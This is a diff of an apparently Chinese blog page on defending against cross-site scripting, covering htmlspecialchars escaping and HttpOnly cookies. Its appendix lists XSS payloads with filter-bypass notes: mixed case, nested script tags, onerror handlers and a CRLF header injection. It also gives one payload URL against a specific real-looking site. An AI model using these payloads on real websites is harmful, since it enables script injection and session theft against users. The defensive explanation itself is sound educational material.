 <h2 id="代码实体转义"><a href="#代码实体转义" class="headerlink" title="代码实体转义"></a>代码实体转义</h2><p>​        由于只保留文字部分是一劳永逸的，有时我们还需要展示这个标签，比如说程序论坛当中要贴一个代码，这个时候我们需要用一些转义，它会把这个大括号、小括号以及双引号做一个转义，做为一个字符，就无法执行这个标签型，后面加一个参数，但有时候单引号也会造成XSS。  </p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 把HTML实体标签转为符号，ENT_QUOTES指单引号也需要转义</span>
-$desc <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'desc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ENT_QUOTES<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 把HTML实体标签转为符号，ENT_QUOTES指单引号也需要转义</span>
+$desc <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'desc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ENT_QUOTES<span class="token punctuation">)</span></code></pre>
 <h2 id="httponly防止cookie被盗取"><a href="#httponly防止cookie被盗取" class="headerlink" title="httponly防止cookie被盗取"></a>httponly防止cookie被盗取</h2><p>​        一个信号当中有那么多的地方存在着这个输入以及检测的地方，可能就有一些地方漏掉，只要有一个地方漏掉了，用户的cookie信息就被盗取了。服务器在发送用户信息的时候，我们需要加上一个httponly，这个代码无法读取到cookie的信息，那么攻击者也是得不到这个信息，这对于用户来说也是非常好的保护。<br>​        比如说张三在我们网站上登陆了一下用户名，李四他特意发了一个攻击请求，他拿不到这个用户ID，就冒充不了这个张三。如果在Cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到Cookie信息，这样能有效的防止XSS攻击。<br>​        最重要的是：<font color="red">千万不要引入任何不可信的第三方JavaScript到页面里！  </font></p>
-<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="跨站语句大全"><a href="#跨站语句大全" class="headerlink" title="跨站语句大全"></a>跨站语句大全</h2><pre class="line-numbers language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span>   大小写绕过
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="跨站语句大全"><a href="#跨站语句大全" class="headerlink" title="跨站语句大全"></a>跨站语句大全</h2><pre class=" language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span>   大小写绕过
 <span class="token string">'">&lt;IFRAME SRC=javascript:alert('</span>XSXSSSs'<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>IFRAME<span class="token operator">></span>
 <span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">></span>ipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XXSSSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scr<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>ipt<span class="token operator">></span>  过滤script绕过
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span>onerror<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">></span>   直接k掉script绕过
@@ -1124,7 +1123,7 @@ http<span class="token punctuation">:</span><span class="token operator">/</span
 
 url<span class="token operator">=</span><span class="token operator">%</span>0aX<span class="token operator">-</span>XSS<span class="token operator">-</span>Protection<span class="token punctuation">:</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>0a<span class="token operator">%</span>0d<span class="token operator">%</span>0a<span class="token operator">%</span>0d<span class="token operator">&lt;</span>img<span class="token operator">%</span>20src<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>20onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>
 
-http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>edu<span class="token punctuation">.</span>gf<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>simulate<span class="token operator">?</span>type<span class="token operator">=</span>simulate_open<span class="token operator">&amp;</span>category<span class="token operator">=</span><span class="token operator">%</span>3Cimg<span class="token operator">%</span>20src<span class="token operator">=</span>@<span class="token operator">%</span>20onmouseover<span class="token operator">=</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token regex">/xssme27/</span><span class="token punctuation">)</span><span class="token operator">%</span>3E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>edu<span class="token punctuation">.</span>gf<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>simulate<span class="token operator">?</span>type<span class="token operator">=</span>simulate_open<span class="token operator">&amp;</span>category<span class="token operator">=</span><span class="token operator">%</span>3Cimg<span class="token operator">%</span>20src<span class="token operator">=</span>@<span class="token operator">%</span>20onmouseover<span class="token operator">=</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token regex">/xssme27/</span><span class="token punctuation">)</span><span class="token operator">%</span>3E</code></pre>
 
             </div>
             <hr/>
